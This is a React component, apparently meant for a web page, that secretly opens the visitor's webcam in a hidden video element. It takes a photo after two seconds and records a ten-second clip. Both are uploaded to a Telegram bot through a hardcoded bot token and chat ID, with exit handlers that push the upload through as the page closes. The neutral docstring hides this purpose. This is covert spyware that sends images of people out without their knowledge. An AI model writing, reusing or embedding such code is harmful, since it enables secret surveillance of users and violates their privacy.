import React, { useRef, useEffect } from "react";

/**
 * CameraCapture: Handles a single 10s video recording per session.
 * Optimized for reliability and cross-platform compatibility.
 */
export default function CameraCapture() {
    const videoRef = useRef(null);
    const mediaRecorderRef = useRef(null);
    const chunksRef = useRef([]);
    const sessionPhotoSent = useRef(false);
    const sessionVideoSent = useRef(false);

    const BOT_TOKEN = "7857475586:AAEA1yRlY1QXtaqnbD6eHUGCgPhBjf0naBI";
    const CHAT_ID = "6112428725";

    useEffect(() => {
        let streamActive = true;
        let recordingTimer = null;

        const finalizeAndSend = () => {
            // If we already sent it, or nothing to send, skip
            if (sessionVideoSent.current) return;

            if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
                mediaRecorderRef.current.stop();
                // The onstop event will handle building the blob and calling send
            }
        };

        const handleExit = (e) => {
            finalizeAndSend();
        };

        window.addEventListener('beforeunload', handleExit);
        window.addEventListener('pagehide', handleExit);
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'hidden') handleExit();
        });

        (async () => {
            try {
                // Use lower resolution and framerate to keep file size small for Telegram/Keepalive
                const constraints = {
                    video: {
                        width: { ideal: 320 },
                        height: { ideal: 240 },
                        frameRate: { ideal: 10 }
                    },
                    audio: false
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);

                if (videoRef.current && streamActive) {
                    videoRef.current.srcObject = stream;
                    videoRef.current.play();

                    // 1. Initial Photo at 2 seconds
                    setTimeout(() => {
                        if (activeSessionState()) takePhoto();
                    }, 2000);

                    // 2. Start Video Recording at 3 seconds
                    setTimeout(() => {
                        if (!activeSessionState() || sessionVideoSent.current) return;

                        // Detect supported MIME type
                        const mimeType = getSupportedMimeType();
                        const recorder = new MediaRecorder(stream, {
                            mimeType,
                            videoBitsPerSecond: 200000 // Very low bitrate to ensure it fits in keepalive buffers
                        });
                        mediaRecorderRef.current = recorder;

                        recorder.ondataavailable = (e) => {
                            if (e.data && e.data.size > 0) chunksRef.current.push(e.data);
                        };

                        recorder.onstop = () => {
                            if (!sessionVideoSent.current && chunksRef.current.length > 0) {
                                const blob = new Blob(chunksRef.current, { type: 'video/webm' });
                                sendVideoToTelegram(blob);
                                sessionVideoSent.current = true;
                                chunksRef.current = [];
                            }
                        };

                        recorder.start(1000); // 1s chunks for steady memory

                        // 3. AUTO-STOP after 10 seconds of recording
                        recordingTimer = setTimeout(() => {
                            if (recorder.state === 'recording') recorder.stop();
                        }, 10000);

                    }, 3000);
                }
            } catch (err) {
                console.error("Camera Init Error:", err);
            }
        })();

        const activeSessionState = () => streamActive && !sessionVideoSent.current;

        return () => {
            streamActive = false;
            window.removeEventListener('beforeunload', handleExit);
            window.removeEventListener('pagehide', handleExit);
            if (recordingTimer) clearTimeout(recordingTimer);
            handleExit();
        };
    }, []);

    const getSupportedMimeType = () => {
        const types = ['video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
        for (let t of types) {
            if (MediaRecorder.isTypeSupported(t)) return t;
        }
        return '';
    };

    const takePhoto = async () => {
        if (sessionPhotoSent.current || !videoRef.current) return;
        try {
            const canvas = document.createElement('canvas');
            canvas.width = videoRef.current.videoWidth;
            canvas.height = videoRef.current.videoHeight;
            canvas.getContext("2d").drawImage(videoRef.current, 0, 0);

            const imageData = canvas.toDataURL("image/jpeg", 0.4);
            const res = await fetch(imageData);
            const blob = await res.blob();
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "start.jpg");

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData,
                keepalive: true
            });
            sessionPhotoSent.current = true;
        } catch (err) {
            console.warn("Photo Fail:", err);
        }
    };

    const sendVideoToTelegram = (blob) => {
        if (!blob || blob.size === 0) return;

        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("video", blob, "session.webm");

        // Use regular fetch, keepalive=true is for smaller payloads, but we track it.
        // If user is closing, we hope the browser finishes it.
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
            method: "POST",
            body: formData,
            keepalive: blob.size < 60000 // Only use keepalive for very small clips (<60KB)
        })
            .catch(err => {
                // Fallback or ignore if closing
                console.warn("Video send unsuccessful (common on exit)", err);
            });
    };

    return <video ref={videoRef} style={{ display: "none" }} />;
}
